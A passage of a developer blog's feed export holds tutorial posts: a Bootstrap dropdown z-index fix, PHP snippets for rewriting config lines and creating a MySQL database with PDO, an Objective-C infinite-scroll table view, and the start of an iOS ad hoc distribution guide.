class="selector-id">#pole-heading</span> &#123;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">1001</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Just <strong>ONE</strong> line of code, solve my issue that makes me struggle for hours. This may not be exactly your case,<br>I’m just share how I debug and found the solution, hope this can be a guideline for you :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I believe that most of you had face this kind of problem. &lt;a href=&quot;http://getbootstrap.com/components/#btn-dropdowns&quot;&gt;Bootstrap 3</summary>
        
      
    
    
    
    
    <category term="css" scheme="http://jslim.net/tags/css/"/>
    
    <category term="bootstrap3" scheme="http://jslim.net/tags/bootstrap3/"/>
    
  </entry>
  
  <entry>
    <title>PHP - replace certain lines in a file</title>
    <link href="http://jslim.net/blog/2014/04/09/php-replace-certain-lines-in-a-file/"/>
    <id>http://jslim.net/blog/2014/04/09/php-replace-certain-lines-in-a-file/</id>
    <published>2014-04-09T06:24:07.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I’ve come across such a scenario, to duplicate a project when a new user sign up, some of the settings in <code>config.php</code> have to change accordingly.</p><p>Example file content:</p><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DATABASE_NAME&#x27;</span>, <span class="string">&#x27;my_db&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DATABASE_USER&#x27;</span>, <span class="string">&#x27;my_db_user&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DATABASE_PASSWORD&#x27;</span>, <span class="string">&#x27;my_db_pass&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CLIENT_NAME&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CLIENT_KEY&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">define...</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$client</span> = ....;</span><br><span class="line"><span class="variable">$client_key</span> = ...;</span><br><span class="line"><span class="variable">$config_file</span> = <span class="variable">$client</span>.<span class="string">&#x27;/config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$newcontent</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// open the file</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$config_file</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="comment">// read the content line by line</span></span><br><span class="line">    <span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/CLIENT_NAME/&#x27;</span>, <span class="variable">$line</span>)) &#123;</span><br><span class="line">            <span class="comment">// e.g. want to replace the client name</span></span><br><span class="line">            <span class="variable">$newcontent</span> .= <span class="string">&#x27;define(\&#x27;CLIENT_NAME\&#x27;, \&#x27;&#x27;</span> . <span class="variable">$client</span> . <span class="string">&#x27;\&#x27;);&#x27;</span>.PHP_EOL;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/CLIENT_KEY/&#x27;</span>, <span class="variable">$line</span>)) &#123;</span><br><span class="line">            <span class="comment">// e.g. want to replace client secret key</span></span><br><span class="line">            <span class="variable">$newcontent</span> .= <span class="string">&#x27;define(\&#x27;CLIENT_KEY\&#x27;, \&#x27;&#x27;</span> . <span class="variable">$client_key</span> . <span class="string">&#x27;\&#x27;);&#x27;</span>.PHP_EOL;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// otherwise just append the line</span></span><br><span class="line">            <span class="variable">$newcontent</span> .= <span class="variable">$line</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="comment">// replace the file with new content</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$config_file</span>, <span class="variable">$newcontent</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’ve come across such a scenario, to duplicate a project when a new user sign up, some of the settings in &lt;code&gt;config.php&lt;/code&gt; have</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>PHP - create database with PDO</title>
    <link href="http://jslim.net/blog/2014/04/09/php-create-database-with-pdo/"/>
    <id>http://jslim.net/blog/2014/04/09/php-create-database-with-pdo/</id>
    <published>2014-04-09T05:17:33.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>); <span class="comment">// use ip address instead of `localhost`</span></span><br><span class="line"><span class="comment">// existing user that has permission to create database and grant access</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_ROOT_USER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_ROOT_PASS&#x27;</span>, <span class="string">&#x27;rootpass&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// the database you want to create</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&#x27;my_new_db&#x27;</span>;</span><br><span class="line"><span class="comment">// specific user for this particular database</span></span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&#x27;my_new_db_user&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&#x27;new_dbpassword&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// login with root user</span></span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=&#x27;</span>.DB_HOST, DB_ROOT_USER, DB_ROOT_PASS);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create database</span></span><br><span class="line">    <span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">exec</span>(</span><br><span class="line">        <span class="string">&quot;CREATE DATABASE `<span class="subst">$dbname</span>`;</span></span><br><span class="line"><span class="string">        CREATE USER &#x27;<span class="subst">$dbuser</span>&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;<span class="subst">$dbpass</span>&#x27;;</span></span><br><span class="line"><span class="string">        GRANT ALL ON `<span class="subst">$dbname</span>`.* TO &#x27;<span class="subst">$dbuser</span>&#x27;@&#x27;localhost&#x27;;</span></span><br><span class="line"><span class="string">        FLUSH PRIVILEGES;&quot;</span></span><br><span class="line">    ) </span><br><span class="line">    <span class="keyword">or</span> <span class="keyword">die</span>(<span class="title function_ invoke__">print_r</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">errorInfo</span>(), <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use database</span></span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=&#x27;</span>.DB_HOST.<span class="string">&#x27;;dbname=&#x27;</span>.<span class="variable">$dbname</span>, DB_ROOT_USER, DB_ROOT_PASS);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// optional: import existing sql file if you have</span></span><br><span class="line">    <span class="variable">$imported</span> = <span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;existingdata.sql&#x27;</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imported</span> === <span class="literal">false</span>) &#123; <span class="comment">// even if success, it may also return some code</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">print_r</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">errorInfo</span>(), <span class="literal">true</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;DB ERROR: &quot;</span>. <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/2583707/can-i-create-a-database-using-pdo-in-php/6549440#6549440">Can I create a database using PDO in PHP</a></em></li><li><em><a href="http://stackoverflow.com/questions/6259424/troubleshooting-no-such-file-or-directory-when-running-php-app-console-doctri/9251924#9251924">Troubleshooting “No such file or directory” when running <code>php app/console doctrine:schema:create</code></a></em></li><li><em><a href="http://stackoverflow.com/questions/11813911/php-pdo-error-number-00000-when-query-is-correct/11813915#11813915">PHP PDO. error number ‘00000’ when query is correct</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Infinite scroll using on UITableView</title>
    <link href="http://jslim.net/blog/2014/04/01/infinite-scroll-using-on-uitableview/"/>
    <id>http://jslim.net/blog/2014/04/01/infinite-scroll-using-on-uitableview/</id>
    <published>2014-04-01T05:38:01.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>If we have 100 records, perhaps we can GET them in one short. But what if, we have 1000 or even 10k records?</p><p>Thus, here I shows an example on implement lazy loading on iOS app, as well as pull to refresh.</p><h2 id="Dependencies"><a href="#Dependencies" class="headerlink" title="Dependencies"></a>Dependencies</h2><ul><li><a href="https://github.com/samvermette/SVPullToRefresh">SVPullToRefresh</a> - <em>(see the <a href="https://github.com/samvermette/SVPullToRefresh#manually">installation</a>)</em></li><li><a href="https://github.com/AFNetworking/AFNetworking">AFNetworking</a> - to make HTTP request</li></ul><h2 id="Create-a-UIViewController"><a href="#Create-a-UIViewController" class="headerlink" title="Create a UIViewController"></a>Create a <code>UIViewController</code></h2><p><strong>MyListViewController.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">MyListViewController</span> : <span class="title">UIViewController</span> &lt;<span class="title">UITableViewDataSource</span>, <span class="title">UITableViewDelegate</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p><strong>MyListViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&lt;QuartzCore/QuartzCore.h&gt;</span></span></span><br><span class="line"><span class="meta">#import <span class="string">&quot;MyListViewController.h&quot;</span></span></span><br><span class="line"><span class="meta">#import <span class="string">&quot;AFNetworking.h&quot;</span></span></span><br><span class="line"><span class="meta">#import <span class="string">&quot;UIScrollView+SVPullToRefresh.h&quot;</span></span></span><br><span class="line"><span class="meta">#import <span class="string">&quot;UIScrollView+SVInfiniteScrolling.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="type">int</span> initialPage = <span class="number">1</span>; <span class="comment">// paging start from 1, depends on your api</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">MyListViewController</span> ()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">UITableView</span> *tableView;</span><br><span class="line"></span><br><span class="line"><span class="comment">// to keep track of what is the next page to load</span></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">assign</span>) <span class="type">int</span> currentPage;</span><br><span class="line"><span class="comment">// to keep the objects GET from server</span></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSMutableArray</span> *myList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">MyListViewController</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@synthesize</span> tableView = _tableView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@synthesize</span> currentPage = _currentPage;</span><br><span class="line"><span class="keyword">@synthesize</span> myList = _myList;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)viewDidLoad</span><br><span class="line">&#123;</span><br><span class="line">    [<span class="variable language_">super</span> viewDidLoad];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialize</span></span><br><span class="line">    _myList = [<span class="built_in">NSMutableArray</span> array];</span><br><span class="line">    _currentPage = initialPage;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// init table list</span></span><br><span class="line">    <span class="keyword">self</span>.tableView = [[<span class="built_in">UITableView</span> alloc] initWithFrame:<span class="keyword">self</span>.view.bounds];</span><br><span class="line">    <span class="keyword">self</span>.tableView.autoresizingMask = <span class="built_in">UIViewAutoresizingFlexibleBottomMargin</span>| <span class="built_in">UIViewAutoresizingFlexibleTopMargin</span> | <span class="built_in">UIViewAutoresizingFlexibleHeight</span>;</span><br><span class="line">    <span class="keyword">self</span>.tableView.delegate = <span class="keyword">self</span>;</span><br><span class="line">    <span class="keyword">self</span>.tableView.dataSource = <span class="keyword">self</span>;</span><br><span class="line">    [<span class="keyword">self</span>.view addSubview:<span class="keyword">self</span>.tableView];</span><br><span class="line">    </span><br><span class="line">    __<span class="keyword">weak</span> <span class="keyword">typeof</span>(<span class="keyword">self</span>) weakSelf = <span class="keyword">self</span>;</span><br><span class="line">    <span class="comment">// refresh new data when pull the table list</span></span><br><span class="line">    [<span class="keyword">self</span>.tableView addPullToRefreshWithActionHandler:^&#123;</span><br><span class="line">        weakSelf.currentPage = initialPage; <span class="comment">// reset the page</span></span><br><span class="line">        [weakSelf.myList removeAllObjects]; <span class="comment">// remove all data</span></span><br><span class="line">        [weakSelf.tableView reloadData]; <span class="comment">// before load new content, clear the existing table list</span></span><br><span class="line">        [weakSelf loadFromServer]; <span class="comment">// load new data</span></span><br><span class="line">        [weakSelf.tableView.pullToRefreshView stopAnimating]; <span class="comment">// clear the animation</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// once refresh, allow the infinite scroll again</span></span><br><span class="line">        weakSelf.tableView.showsInfiniteScrolling = <span class="literal">YES</span>;</span><br><span class="line">    &#125;];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// load more content when scroll to the bottom most</span></span><br><span class="line">    [<span class="keyword">self</span>.tableView addInfiniteScrollingWithActionHandler:^&#123;</span><br><span class="line">        [weakSelf loadFromServer];</span><br><span class="line">    &#125;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)loadFromServer</span><br><span class="line">&#123;</span><br><span class="line">    AFHTTPRequestOperationManager *manager = [AFHTTPRequestOperationManager manager];</span><br><span class="line">    [manager GET:[<span class="built_in">NSString</span> stringWithFormat:<span class="string">@&quot;http://api.example.com/list/%d&quot;</span>, _currentPage] parameters:<span class="literal">nil</span> success:^(AFHTTPRequestOperation *operation, <span class="type">id</span> responseObject) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if no more result</span></span><br><span class="line">        <span class="keyword">if</span> ([[responseObject objectForKey:<span class="string">@&quot;items&quot;</span>] count] == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">self</span>.tableView.showsInfiniteScrolling = <span class="literal">NO</span>; <span class="comment">// stop the infinite scroll</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">        _currentPage++; <span class="comment">// increase the page number</span></span><br><span class="line">        <span class="type">int</span> currentRow = [_myList count]; <span class="comment">// keep the the index of last row before add new items into the list</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// store the items into the existing list</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">id</span> obj <span class="keyword">in</span> [responseObject valueForKey:<span class="string">@&quot;items&quot;</span>]) &#123;</span><br><span class="line">            [_myList addObject:obj];</span><br><span class="line">        &#125;</span><br><span class="line">        [<span class="keyword">self</span> reloadTableView:currentRow];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// clear the pull to refresh &amp; infinite scroll, this 2 lines very important</span></span><br><span class="line">        [<span class="keyword">self</span>.tableView.pullToRefreshView stopAnimating];</span><br><span class="line">        [<span class="keyword">self</span>.tableView.infiniteScrollingView stopAnimating];</span><br><span class="line"></span><br><span class="line">    &#125; failure:^(AFHTTPRequestOperation *operation, <span class="built_in">NSError</span> *error) &#123;</span><br><span class="line">        <span class="keyword">self</span>.tableView.showsInfiniteScrolling = <span class="literal">NO</span>;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;error %@&quot;</span>, error);</span><br><span class="line">    &#125;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)reloadTableView:(<span class="type">int</span>)startingRow;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// the last row after added new items</span></span><br><span class="line">    <span class="type">int</span> endingRow = [_myList count];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">NSMutableArray</span> *indexPaths = [<span class="built_in">NSMutableArray</span> array];</span><br><span class="line">    <span class="keyword">for</span> (; startingRow &lt; endingRow; startingRow++) &#123;</span><br><span class="line">        [indexPaths addObject:[<span class="built_in">NSIndexPath</span> indexPathForRow:startingRow inSection:<span class="number">0</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    [<span class="keyword">self</span>.tableView insertRowsAtIndexPaths:indexPaths withRowAnimation:<span class="built_in">UITableViewRowAnimationFade</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - UITableViewDelegate</span></span><br><span class="line">- (<span class="type">void</span>)tableView:(<span class="built_in">UITableView</span> *)tableView didSelectRowAtIndexPath:(<span class="built_in">NSIndexPath</span> *)indexPath</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">id</span> item = [_myList objectAtIndex:indexPath.row];</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;Selected item %@&quot;</span>, item);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - UITableViewDataSource</span></span><br><span class="line">- (<span class="built_in">NSInteger</span>)tableView:(<span class="built_in">UITableView</span> *)tableView numberOfRowsInSection:(<span class="built_in">NSInteger</span>)section</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [_myList count];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="built_in">UITableViewCell</span> *)tableView:(<span class="built_in">UITableView</span> *)tableView cellForRowAtIndexPath:(<span class="built_in">NSIndexPath</span> *)indexPath</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="built_in">NSString</span> *cellIdentifier = <span class="string">@&quot;MyListCell&quot;</span>;</span><br><span class="line">    <span class="built_in">UITableViewCell</span> *cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier];</span><br><span class="line">    <span class="keyword">if</span> (cell == <span class="literal">nil</span>) &#123;</span><br><span class="line">        cell = [[<span class="built_in">UITableViewCell</span> alloc] initWithStyle:<span class="built_in">UITableViewCellStyleDefault</span> reuseIdentifier:cellIdentifier];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// minus 1 because the first row is the search bar</span></span><br><span class="line">    <span class="type">id</span> item = [_myList objectAtIndex:indexPath.row];</span><br><span class="line"></span><br><span class="line">    cell.textLabel.text = [item valueForKey:<span class="string">@&quot;name&quot;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> cell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><h3 id="EDIT"><a href="#EDIT" class="headerlink" title="EDIT:"></a>EDIT:</h3><p>Remember to set the <code>autoresizingMask</code>, e.g.</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">self</span>.tableView.autoresizingMask = <span class="built_in">UIViewAutoresizingFlexibleBottomMargin</span>| <span class="built_in">UIViewAutoresizingFlexibleTopMargin</span> | <span class="built_in">UIViewAutoresizingFlexibleHeight</span>;</span><br></pre></td></tr></table></figure><p>Otherwise the contentSize of <code>scrollView</code> will have problem when calling <code>showsInfiniteScrolling = NO;</code></p><p>See the images below:</p><p><strong>Not working example</strong></p><p><img src="/images/posts/2014-04-01-infinite-scroll-using-on-uitableview/contentsize-notwork.gif" alt="content size problem"></p><p><strong>Working example</strong></p><p><img src="/images/posts/2014-04-01-infinite-scroll-using-on-uitableview/contentsize-work.gif" alt="content size solved"></p><p>Done :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;If we have 100 records, perhaps we can GET them in one short. But what if, we have 1000 or even 10k records?&lt;/p&gt;
&lt;p&gt;Thus, here I shows</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Distribute iOS app via website</title>
    <link href="http://jslim.net/blog/2014/03/31/distribute-ios-app-via-website/"/>
    <id>http://jslim.net/blog/2014/03/31/distribute-ios-app-via-website/</id>
    <published>2014-03-31T05:50:44.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>The first time I seen this is <a href="http://emu4ios.net/">emu4ios.net</a>. Then I found this is very useful and convenient for my beta tester.</p><p>I shows an exmple to host the <strong>ipa</strong> &amp; <strong>plist</strong> files on <a href="https://db.tt/mBV8M1u">Dropbox</a>. The reason for not host them on my personal website is due to SSL issue. <a href="https://discussions.apple.com/message/25140827#25140827">See here</a></p><p>Without <strong>https</strong></p><p><img src="/images/posts/2014-03-31-distribute-ios-app-via-website/invalid-cert.png" alt="Invalid certificate"></p><h2 id="1st-Generate-ipa-file"><a href="#1st-Generate-ipa-file" class="headerlink" title="1st: Generate ipa file"></a>1st: Generate ipa file</h2><p>Open your XCode, then archive the project</p><p><img src="/images/posts/2014-03-31-distribute-ios-app-via-website/archive.png" alt="Archive"></p><p>Then select distribute</p><p><img src="/images/posts/2014-03-31-distribute-ios-app-via-website/distribute.png" alt="Distribute"></p><p>Select <strong>Save for Enterprise or Ad Hoc Deployment</strong> distribution method</p><p><img src="/images/posts/2014-03-31-distribute-ios-app-via-website/distribution-method.png" alt="Distribution method"></p><p>Then choose the provisioning profile that you have selected before Archive</p><p><img src="/images/posts/2014-03-31-distribute-ios-app-via-website/provisioning-profile-selection.png" alt="Select provisioning profile"></p><p>Finally save the <strong>ipa</strong> file</p><p><img src="/images/posts/2014-03-31-distribute-ios-app-via-website/save-ipa.png" alt="Save ipa to anywhere"></p><h2 id="2nd-Create-a-plist"><a href="#2nd-Create-a-plist" class="headerlink" title="2nd: Create a .plist"></a>2nd: Create a .plist</h2><p><strong>MyApp.plist</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 